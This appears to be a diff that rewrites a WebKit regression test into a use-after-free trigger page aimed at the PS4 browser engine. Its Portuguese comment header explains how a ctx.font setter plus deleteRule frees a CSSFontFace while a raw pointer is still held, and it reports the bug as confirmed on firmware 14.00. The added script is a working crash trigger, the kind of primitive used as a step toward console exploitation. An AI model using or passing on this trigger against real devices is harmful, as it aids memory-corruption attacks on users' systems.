@@ -1,36 +1,64 @@
-
-<!-- Identical to offscreen-canvas2d-measuretext-uaf.html, but exercising CanvasRenderingContext2D path -->
 <!DOCTYPE html>
-<p>This test passes if it does not crash.</p>
+<!--
+  UAF: CSSFontFace via ctx.font setter + deleteRule + layout
+  ===========================================================
+  Bug class  : Use-After-Free (CWE-416)
+  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15
+  Trigger    : ctx.font = 'size FontName'
+  Victim C++ : CSSFontFace — objeto liberado por deleteRule()
+               enquanto font selection code segura raw pointer
+
+  MECANISMO:
+  ----------
+  1. <style id="v"> registra @font-face CSS para familia 'T'
+     → WebKit cria CSSFontFace C++ para esta regra
+  2. JS FontFace para mesma familia 'T' adicionado ao document.fonts
+  3. ctx.font = '10px T' → setFont() → CSSFontSelector::fontForFamily('T')
+     → ES2015 thenable check → [[Get]] FontFace.prototype.then
+  4. Getter dispara com CSSFontFace C++ referenciado na call stack
+  5. deleteRule(0) remove a regra CSS → CSSFontFace C++ destruido
+  6. document.body.offsetTop forca layout confirmando a destruicao
+  7. font selection code continua com raw pointer dangling → UAF → CRASH
+
+  DIFERENCA DO UAF_FontFace confirmado pela Sony:
+  -----------------------------------------------
+  Mesmo padrao de destruicao de CSSFontFace via CSS rule removal,
+  porem com trigger ctx.font setter (novo!) em vez de
+  document.fonts.load() / ctx.measureText().
+
+  CONFIRMADO: PS4 FW 14.00 — secao D V1 do diagnostico v4
+-->
+<html>
+<head>
+<style id="v">@font-face { font-family: T; src: local(Helvetica); }</style>
+</head>
+<body>
 <script>
-  
+function trigger() {
+    var face = new FontFace('T', 'local(Helvetica)');
+    document.fonts.add(face);
+    void face.loaded;
 
-  let face = new FontFace('MyTestFam', 'local(Helvetica)');
-  face.loaded;
-  document.fonts.add(face);
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            if (fired) return undefined;
+            fired = true;
+            var s = document.getElementById('v');
+            if (s && s.sheet && s.sheet.cssRules.length > 0) {
+                s.sheet.deleteRule(0);
+            }
+            void document.body.offsetTop;
+            return undefined;
+        }
+    });
 
-  let context = document.createElement('canvas').getContext('2d');
+    var c = document.createElement('canvas');
+    c.getContext('2d').font = '10px T';
+}
 
-  context.save();
-  context.lineWidth = 0.5;
-
-  context.font = '10px MyTestFam';
-
-  let reentered = false;
-  Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-      if (reentered)
-        return undefined;
-      reentered = true;
-      for (let i = 0; i < 18; i++) {
-        context.save();
-        context.lineWidth = 1 + i;
-      }
-      reentered = false;
-      return undefined;
-    }
-  });
-
-  context.measureText('a');
+window.onload = function() { setTimeout(trigger, 0); };
 </script>
+</body>
+</html>
